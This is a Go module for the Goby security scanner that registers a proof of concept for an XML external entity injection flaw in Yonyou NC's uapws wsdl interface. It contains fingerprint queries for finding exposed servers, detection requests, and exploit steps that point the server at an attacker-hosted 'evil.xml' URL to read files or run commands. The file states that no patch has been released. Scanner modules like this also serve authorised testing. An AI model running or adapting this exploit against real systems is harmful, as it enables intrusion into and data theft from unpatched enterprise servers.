package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyon NC uapws wsdl XML External Entity Injection Vulnerability",
    "Description": "<p>Yonyou NC is a digital platform for large-scale enterprises, deeply applying the new generation of digital intelligence technology, creating an open, interconnected, integrated, and intelligent integrated platform, focusing on digital intelligence management, digital intelligence management, and digital intelligence business. Transform strategic direction, provide 18 solutions covering digital marketing, financial sharing, global treasury, intelligent manufacturing, agile supply chain, talent management, intelligent collaboration, etc., to help large enterprises fully implement digital intelligence.</p><p>UFIDA NC system uapws has a wsdl interface, which can pass in internal or external xml through a specified path for analysis, resulting in XXE vulnerabilities. Attackers can read server files, execute arbitrary commands, etc. through XXE vulnerabilities.</p>",
    "Impact": "<p>Yonyou NC system uapws has a wsdl interface, which can pass in internal or external xml through a specified path for analysis, resulting in XXE vulnerabilities. Attackers can read server files, execute arbitrary commands, etc. through XXE vulnerabilities.</p>",
    "Recommendation": "<p>At present, the official has not released a security patch, please pay attention to the manufacturer's update.<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "Product": "yonyou-NC-Cloud",
    "VulType": [
        "XML External Entity Injection"
    ],
    "Tags": [
        "XML External Entity Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "用友 NC uapws wsdl XML 外部实体注入漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC 大型企业数字化平台，深度应用新一代数字智能技术，打造开放、互联、融合、智能的一体化平台，聚焦数智化管理、数智化经营、数智化商业等三大企业数智化转型战略方向，提供涵盖数字营销、财务共享、全球司库、智能制造、敏捷供应链、人才管理、智慧协同等18大解决方案，帮助大型企业全面落地数智化。<br></p><p>用友 NC 系统 uapws 存在 wsdl 接口，可通过指定路径传入内部或外部的 xml 进行解析，造成 XXE 漏洞。攻击者可以通过 XXE 漏洞读取服务器文件，执行任意命令等。<br></p>",
            "Recommendation": "<p>目前官方尚未发布安全补丁，请关注厂商更新：<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>用友 NC 系统 uapws 存在 wsdl 接口，可通过指定路径传入内部或外部的 xml 进行解析，造成 XXE 漏洞。攻击者可以通过 XXE 漏洞读取服务器文件，执行任意命令等。<br></p>",
            "VulType": [
                "XML外部实体注入"
            ],
            "Tags": [
                "XML外部实体注入"
            ]
        },
        "EN": {
            "Name": "Yonyon NC uapws wsdl XML External Entity Injection Vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Yonyou NC is a digital platform for large-scale enterprises, deeply applying the new generation of digital intelligence technology, creating an open, interconnected, integrated, and intelligent integrated platform, focusing on digital intelligence management, digital intelligence management, and digital intelligence business. Transform strategic direction, provide 18 solutions covering digital marketing, financial sharing, global treasury, intelligent manufacturing, agile supply chain, talent management, intelligent collaboration, etc., to help large enterprises fully implement digital intelligence.</p><p>UFIDA NC system uapws has a wsdl interface, which can pass in internal or external xml through a specified path for analysis, resulting in XXE vulnerabilities. Attackers can read server files, execute arbitrary commands, etc. through XXE vulnerabilities.</p>",
            "Recommendation": "<p>At present, the official has not released a security patch, please pay attention to the manufacturer's update.<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>Yonyou NC system uapws has a wsdl interface, which can pass in internal or external xml through a specified path for analysis, resulting in XXE vulnerabilities. Attackers can read server files, execute arbitrary commands, etc. through XXE vulnerabilities.<br></p>",
            "VulType": [
                "XML External Entity Injection"
            ],
            "Tags": [
                "XML External Entity Injection"
            ]
        }
    },
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"../Client/Uclient/UClient.dmg\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"../Client/Uclient/UClient.dmg\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2022-04-15",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/uapws/service/nc.uap.oba.update.IUpdateService?wsdl",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Type: text/xml;",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml version='1.0' encoding='UTF-8'?>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "?xsd=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/uapws/service/nc.uap.oba.update.IUpdateService?xsd={{{xmlUrl}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "xmlUrl",
            "type": "input",
            "value": "http://1.1.1.1/evil.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10831"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
